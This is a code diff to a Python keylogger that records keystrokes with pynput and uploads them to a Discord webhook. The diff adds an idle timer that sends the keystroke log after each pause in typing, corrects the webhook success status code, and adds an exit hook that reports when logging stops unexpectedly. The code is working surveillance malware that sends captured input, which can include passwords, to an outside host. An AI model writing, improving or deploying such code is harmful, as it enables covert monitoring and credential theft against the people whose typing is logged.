@@ -4,6 +4,7 @@ import requests
 import threading
 import getpass
 import sys
+import atexit
 from pynput import keyboard
 import time
 
@@ -43,7 +44,7 @@ def reset_key_tracking():
 
 # Function to handle key press events
 def on_press(key):
-    global idle_time, key_set, key_count, key_timer
+    global idle_time, key_set, key_count, key_timer, log_timer
     idle_time = 30  # Reset idle time to 30 seconds on key press
     try:
         with open(log_path, 'a') as f:
@@ -76,6 +77,12 @@ def on_press(key):
         key_timer = threading.Timer(1, reset_key_tracking)
         key_timer.start()
 
+    # Reset the log timer
+    if log_timer is not None:
+        log_timer.cancel()
+    log_timer = threading.Timer(idle_time, send_log_to_discord)
+    log_timer.start()
+
     # Check if the desired keys are pressed twice
     if key_set == desired_keys and key_count >= 6:
         stop_keylogger()
@@ -106,7 +113,7 @@ def send_log_to_discord():
                 "content": message
             }
             response = requests.post(webhook_url, json=data)
-            if response.status_code == 200:
+            if response.status_code == 204:
                 print('Idle message sent successfully.')
             else:
                 print(f'Failed to send idle message. Status code: {response.status_code}')
@@ -117,7 +124,7 @@ def send_log_to_discord():
                     'file': (os.path.basename(log_path), f)
                 }
                 response = requests.post(webhook_url, files=files)
-                if response.status_code == 200:
+                if response.status_code == 204:
                     print('Log file sent successfully.')
                 else:
                     print(f'Failed to send log file. Status code: {response.status_code}')
@@ -140,7 +147,7 @@ def send_start_message():
             "content": start_message
         }
         response = requests.post(webhook_url, json=data)
-        if response.status_code == 200:
+        if response.status_code == 204:
             print('Start message sent successfully.')
             start_message_sent = True
         else:
@@ -153,10 +160,25 @@ def send_end_message():
         "content": end_message
     }
     response = requests.post(webhook_url, json=data)
-    if response.status_code == 200:
+    if response.status_code == 204:
         print('End message sent successfully.')
     else:
         print(f'Failed to send end message. Status code: {response.status_code}')
+
+# Function to send the unexpected quit message to Discord
+def send_unexpected_quit_message():
+    quit_message = f"Logging for {user_name} quit unexpectedly"
+    data = {
+        "content": quit_message
+    }
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 204:
+        print('Unexpected quit message sent successfully.')
+    else:
+        print(f'Failed to send unexpected quit message. Status code: {response.status_code}')
+
+# Register the unexpected quit message to be sent on exit
+atexit.register(send_unexpected_quit_message)
 
 # Send the start message
 send_start_message()
